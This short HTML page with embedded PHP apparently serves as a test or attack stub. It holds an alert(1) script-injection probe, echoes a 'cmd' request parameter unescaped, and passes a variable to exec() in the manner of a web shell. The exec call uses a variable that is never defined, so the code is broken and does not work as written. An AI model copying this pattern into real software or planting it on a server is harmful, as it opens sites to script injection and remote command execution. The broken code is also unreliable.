<html>
<body>

<script>
    alert(1);
</script>

Hello! 
<?php

echo $_GET["cmd"];

$output = exec($command);


echo $output;

?>

</body>
</html>